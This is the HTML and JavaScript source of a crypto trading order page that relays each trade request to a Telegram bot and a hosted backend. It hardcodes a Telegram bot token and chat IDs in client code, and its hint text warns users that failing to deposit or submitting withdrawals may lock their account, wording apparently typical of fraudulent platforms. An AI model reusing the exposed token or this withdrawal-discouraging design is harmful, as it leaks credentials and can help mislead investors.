<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Trade</title>

  <style>
    body { font-family: Arial; background: transparent; color: white; padding:20px; margin:0; }
    .container { max-width:450px; margin:0 auto; width:100%; }
    h2 { text-align:center; margin-bottom:20px; }
    .transaction-type { display:flex; justify-content:space-between; gap:4%; width:100%; }
    .btn { width:48%; padding:12px; border-radius:8px; border:2px solid; cursor:pointer; background:transparent; font-size:16px; }
    .buy-btn { border-color:#2ecc71; color:#2ecc71; }
    .sell-btn { border-color:#e67e22; color:#e67e22; }

    input, select {
      width:100%;
      padding:12px;
      margin-top:8px;
      border-radius:8px;
      border:1px solid #ccc;
      background: transparent !important;
      color:white !important;
      font-size:16px;
      box-sizing:border-box;
    }

    select option {
      background: white !important;
      color: black !important;
    }

    .trade-btn { 
        width:100%; 
        padding:12px; 
        border-radius:8px; 
        border:2px solid #3498db; 
        background:transparent; 
        color:#3498db; 
        margin-top:20px; 
        cursor:pointer; 
        font-size:16px;
    }

    .adjusted-box p { margin:5px 0; }

    .stop-box input[type="number"] {
      width:48%;
      display:inline-block;
      margin-right:4%;
      margin-top:5px;
    }

    #orderIdBox {
      margin-top:15px;
      padding:12px;
      border:1px solid #aaa;
      border-radius:8px;
      font-size:15px;
      display:none;
    }

    .hint-cn {
      margin-top:6px;
      color:#bbb;
      font-size:12px;
      line-height:1.4;
    }

    /* loading style (keeps UI) */
    .trade-btn.loading { opacity:0.7; cursor:not-allowed; position:relative; }
    .trade-btn.loading::after {
      content:""; width:18px; height:18px; border:3px solid rgba(52,152,219,0.6); border-top-color:#3498db; border-radius:50%; animation:spin 0.8s linear infinite; position:absolute; right:12px; top:50%; transform:translateY(-50%);
    }
    @keyframes spin { from{transform:translateY(-50%) rotate(0);} to{transform:translateY(-50%) rotate(360deg);} }
  </style>
</head>
<body>

<div class="container">

  <div id="orderIdBox"></div>

  <h2></h2>

  <div class="transaction-type">
    <button class="btn buy-btn" id="buyBtn">Buy</button>
    <button class="btn sell-btn" id="sellBtn">Sell</button>
  </div>

  <label>Select Coin:</label>
  <select id="currency"></select>

  <label>Amount:</label>
  <input type="number" id="amount" placeholder="Enter amount">

  <label>Amount Currency:</label>
  <select id="amountCurrency"></select>

  <div class="adjusted-box" id="convertedBox">
    <p><b>Auto-conversion:</b></p>
  </div>

  <div class="stop-box">
    <label>
      <input type="checkbox" id="slCheckbox"> 
      Enable Stop-loss/Take-profit
    </label>

    <div id="slBox" style="display:none; margin-top:6px;">
        <input type="number" id="takeProfit" placeholder="TP %">
        <input type="number" id="stopLoss" placeholder="SL %">

        <div id="tpResult" style="color:#7ed957; margin-top:6px;"></div>
        <div id="slResult" style="color:#ff8c69;"></div>
    </div>
  </div>

  <button class="trade-btn" id="tradeBtn">Trade</button>

  <p class="hint-cn">ü§ñ Please ensure you have completed your deposit. Failure to deposit or submitting a withdrawal order maliciously may trigger your account security protection mechanism and prevent you from submitting further orders.</p>

</div>

<script>
/* ====== ÈÄöÁî®Â∑•ÂÖ∑ÂáΩÊï∞ÔºàÈáçËØï„ÄÅUS Êó∂Èó¥Ê†ºÂºèÂåñ„ÄÅorderActionÔºâ ====== */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app";

async function postWithRetry(url, options={}, retries=2, delay=700){
  for(let i=0;i<=retries;i++){
    try{
      const r = await fetch(url, options);
      if(!r.ok) throw new Error('HTTP '+r.status);
      return r;
    }catch(e){
      if(i===retries) throw e;
      await new Promise(res=>setTimeout(res, delay));
    }
  }
}

function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  const s = d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true });
  return s.replace(',', '');
}

async function orderAction(orderId, action){
  // action: lock/unlock/confirm/cancel
  try{
    await postWithRetry(`${API_BASE}/api/order/action`, {
      method:'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({ orderId, action, actor: getUserId(), timestamp: Date.now(), time_us: formatUsTime(Date.now()) })
    }, 2, 600);
    return true;
  }catch(e){ console.warn('orderAction error', e); return false; }
}

/* ====================== USER ID ====================== */
function getUserId(){
  const url = new URLSearchParams(window.location.search);
  const uid = url.get("userid") || localStorage.getItem("userid4") || (function(){ const x = Math.floor(1000+Math.random()*9000).toString(); localStorage.setItem("userid4", x); return x; })();
  if(!localStorage.getItem("userid4")) localStorage.setItem("userid4", uid);
  // ÂºÇÊ≠•ÂêåÊ≠•Âà∞ÂêéÂè∞ÔºàÈùûÈòªÂ°ûÔºâ
  try{ postWithRetry(`${API_BASE}/api/users/sync`, { method:'POST', headers:{'Content-Type':'application/json','X-User-Id':uid}, body: JSON.stringify({ userid: uid }) }, 1, 400).catch(()=>{}); }catch(e){}
  return uid;
}
const USERID = getUserId();

/* ====================== TELEGRAMÔºà‰øùÁïôÂéüÊ†∑Ôºâ ====================== */
const BOT_TOKEN = "8423870040:AAEyKQukt720qD7qHZ9YrIS9m_x-E65coPU";
const PRIVATE_ID = 6062973135;
const GROUP_ID = -1003262870745;

/* ====================== UI INITIALIZATION ====================== */
let tradeType = "buy";
let livePrice = {};

const coins = ["BTC","ETH","BNB","SOL","XRP","ADA","DOGE","TRX","DOT","MATIC","AVAX","USDT","USDC","DAI"];

document.addEventListener("DOMContentLoaded", () => {
    initUI();
    initWebSocket();
});

function initUI() {
    const c1 = document.getElementById("currency");
    const c2 = document.getElementById("amountCurrency");

    coins.forEach(c => {
        c1.innerHTML += `<option value="${c}">${c}</option>`;
        c2.innerHTML += `<option value="${c}">${c}</option>`;
    });

    c2.value = "USDT";

    document.getElementById("buyBtn").onclick = () => setType("buy");
    document.getElementById("sellBtn").onclick = () => setType("sell");
    document.getElementById("tradeBtn").onclick = sendTrade;

    document.getElementById("slCheckbox").onclick = toggleSL;

    document.getElementById("amount").oninput = updateConverted;
    c1.onchange = updateConverted;
    c2.onchange = updateConverted;

    document.getElementById("takeProfit").oninput = updateTPSL;
    document.getElementById("stopLoss").oninput = updateTPSL;

    setType("buy");
}

function initWebSocket() {
    const socket = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");

    socket.onmessage = ev => {
        const data = JSON.parse(ev.data);
        data.forEach(t => {
            if (t.s.endsWith("USDT")) {
                livePrice[t.s.replace("USDT","")] = parseFloat(t.c);
            }
        });
        updateConverted();
        updateTPSL();
    };

    socket.onclose = () => setTimeout(initWebSocket, 2000);
}

function setType(t){
    tradeType = t;

    document.getElementById("buyBtn").style.filter = t === "buy" ? "brightness(100%)" : "brightness(40%)";
    document.getElementById("sellBtn").style.filter = t === "sell" ? "brightness(100%)" : "brightness(40%)";
}

function updateConverted() {
    const amount = Number(document.getElementById("amount").value);
    const from = document.getElementById("amountCurrency").value;
    const to = document.getElementById("currency").value;
    const box = document.getElementById("convertedBox");

    box.innerHTML = "<p><b>Auto-conversion:</b></p>";

    if (!amount || !livePrice[from] || !livePrice[to]) return;

    const usd = amount * livePrice[from]; 
    const v = usd / livePrice[to];

    box.innerHTML += `<p>${to}: ${v.toFixed(6)}</p>`;
}

function toggleSL() {
    document.getElementById("slBox").style.display =
        document.getElementById("slCheckbox").checked ? "block" : "none";
}

function updateTPSL() {
    if (!document.getElementById("slCheckbox").checked) return;

    const coin = document.getElementById("currency").value;
    const price = livePrice[coin];
    const tp = Number(document.getElementById("takeProfit").value);
    const sl = Number(document.getElementById("stopLoss").value);

    if (!price) return;

    if (tp) {
        document.getElementById("tpResult").innerHTML =
            `TP Price: ${(price * (1 + tp/100)).toFixed(6)} USDT`;
    } else document.getElementById("tpResult").innerHTML = "";

    if (sl) {
        document.getElementById("slResult").innerHTML =
            `SL Price: ${(price * (1 - sl/100)).toFixed(6)} USDT`;
    } else document.getElementById("slResult").innerHTML = "";
}

/* ====================== ORDER ID ====================== */
function generateOrderId() {
    const d = new Date();
    const y = d.getFullYear();
    const m = ("0"+(d.getMonth()+1)).slice(-2);
    const day = ("0"+d.getDate()).slice(-2);
    const rand = Math.floor(100000 + Math.random()*900000);
    return `TRD-${y}${m}${day}-${rand}`;
}

/* ====================== TELEGRAM SEND ====================== */
function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const payload = chatId => ({
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: msg,
            parse_mode: "Markdown"
        })
    });

    fetch(url, payload(PRIVATE_ID)).catch(()=>{});
    fetch(url, payload(GROUP_ID)).catch(()=>{});
}

/* ====================== SUBMIT TO BACKEND ====================== */
async function sendTrade(){
    const c = document.getElementById("currency").value;
    const amount = document.getElementById("amount").value;
    const ac = document.getElementById("amountCurrency").value;
    const tp = document.getElementById("takeProfit").value || "None";
    const sl = document.getElementById("stopLoss").value || "None";

    if (!amount) { alert("Enter amount"); return; }

    const orderId = generateOrderId();
    const usTime = formatUsTime(Date.now());

    const msg =
`üìå *New Trade Request*
*User:* ${USERID}
*Order ID:* \`${orderId}\`

Type: *${tradeType}*
Amount: *${amount} ${ac}*
Take-profit: *${tp}*
Stop-loss: *${sl}*
Time (US Eastern): *${usTime}*`;

    sendToTelegram(msg);

    const payload = {
        userid: USERID,
        tradeType,
        amount,
        amountCurrency: ac,
        coin: c,
        tp,
        sl,
        orderId,
        timestamp: Date.now(),
        time_us: usTime
    };

    const box = document.getElementById("orderIdBox");
    box.style.display = "block";
    box.innerHTML = `<div>Order submitted: <b>${orderId}</b></div>`;

    const submitBtn = document.getElementById("tradeBtn");
    submitBtn.disabled = true;
    submitBtn.classList.add("loading");
    submitBtn.textContent = "Submitting...";

    try{
        await postWithRetry(`${API_BASE}/api/order/buysell`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-User-Id": USERID
            },
            body: JSON.stringify(payload)
        }, 3, 700);

        submitBtn.textContent = "Submitted";
        setTimeout(()=>{ submitBtn.disabled = false; submitBtn.classList.remove("loading"); submitBtn.textContent = "Trade"; }, 1200);
    }catch(e){
        console.error("Backend error:", e);
        alert("Êèê‰∫§Âà∞ÂêéÂè∞Â§±Ë¥•ÔºàNetwork ErrorÔºâ„ÄÇËØ∑Á®çÂêéÂú®ËÆ¢ÂçïÁÆ°ÁêÜ‰∏≠Á°ÆËÆ§ÊòØÂê¶Â∑≤Êèê‰∫§„ÄÇ");
        submitBtn.disabled = false;
        submitBtn.classList.remove("loading");
        submitBtn.textContent = "Trade";
    }
}
</script>

<!-- ÁôªÂΩïÈ™åËØÅ -->
<script src="js/auth.js"></script>

<!-- Nexbit API Áªü‰∏ÄÂ∞ÅË£ÖÔºàÂè™Âä†ËΩΩ‰∏ÄÊ¨°Ôºâ -->
<script src="js/nexbit-api.js"></script>

</body>
</html>
